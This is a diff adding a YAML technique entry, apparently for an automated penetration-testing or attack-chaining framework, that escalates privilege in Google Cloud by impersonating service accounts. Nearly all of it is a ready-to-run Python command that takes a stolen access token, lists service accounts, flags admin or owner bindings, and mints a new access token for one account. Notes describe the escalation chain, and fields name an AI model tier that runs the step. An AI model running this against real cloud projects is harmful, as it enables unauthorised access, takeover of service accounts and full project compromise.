@@ -1,0 +1,74 @@
+name: gcp_sa_impersonate
+category: cloud
+description: Enumerate GCP service accounts and attempt impersonation for privilege escalation
+preconditions:
+- cloud.gcp_token_available
+parameters:
+  gcp_token: from_finding.gcp_access_token
+  project_id: from_finding.gcp_project_id
+command_template: >
+  python3 -c "
+  import urllib.request, json, sys
+
+  token = '{gcp_token}'
+  project = '{project_id}'
+  headers = {'Authorization': f'Bearer {token}',
+             'Content-Type': 'application/json'}
+
+  # List service accounts in project
+  url = f'https://iam.googleapis.com/v1/projects/{project}/serviceAccounts'
+  req = urllib.request.Request(url, headers=headers)
+  try:
+      with urllib.request.urlopen(req, timeout=15) as r:
+          data = json.loads(r.read())
+      accounts = data.get('accounts', [])
+      print(f'Found {len(accounts)} service accounts in {project}')
+      for sa in accounts[:10]:
+          email = sa['email']
+          print(f'  SA: {email}')
+          # Check IAM bindings for this SA
+          iam_url = f'https://iam.googleapis.com/v1/projects/{project}/serviceAccounts/{email}:getIamPolicy'
+          try:
+              req2 = urllib.request.Request(iam_url, data=b'{}', headers=headers, method='POST')
+              with urllib.request.urlopen(req2, timeout=10) as r2:
+                  iam = json.loads(r2.read())
+              bindings = iam.get('bindings', [])
+              for b in bindings:
+                  if 'admin' in b.get('role','').lower() or 'owner' in b.get('role','').lower():
+                      print(f'    [!] Privileged role: {b[\"role\"]}')
+          except: pass
+
+      # Try to generate access token for first SA (impersonation)
+      if accounts:
+          sa_email = accounts[0]['email']
+          tok_url = f'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{sa_email}:generateAccessToken'
+          body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform']}).encode()
+          req3 = urllib.request.Request(tok_url, data=body, headers=headers)
+          try:
+              with urllib.request.urlopen(req3, timeout=10) as r3:
+                  tok_data = json.loads(r3.read())
+              print(f'[!] IMPERSONATED {sa_email}')
+              print(f'    token expires: {tok_data.get(\"expireTime\",\"?\")}')
+          except Exception as e:
+              print(f'Impersonation denied for {sa_email}: {e}')
+  except Exception as e:
+      print(f'Error: {e}')
+  "
+parser: generic_parser
+expected_effects:
+- gcp_service_accounts_enumerated
+- cloud_privilege_escalated
+- cloud.gcp_token_available
+falsifier:
+  pattern: 403|PERMISSION_DENIED|invalid_grant|Token has been expired
+  timeout: 30
+model_tier: sonnet
+mechanism: >
+  GCP SA impersonation requires iam.serviceAccounts.actAs or roles/iam.serviceAccountTokenCreator.
+  generateAccessToken creates a short-lived token for any SA the caller can impersonate.
+  Chain: low-priv SA → find SA with roles/editor → impersonate → full project access.
+  Service accounts with domain-wide delegation can impersonate Workspace users.
+  Also check for SA key files in metadata attributes or instance storage.
+hacktricks_ref: cloud-security/gcp-security/gcp-iam-privilege-escalation.md
+destructive: false
+opsec: medium
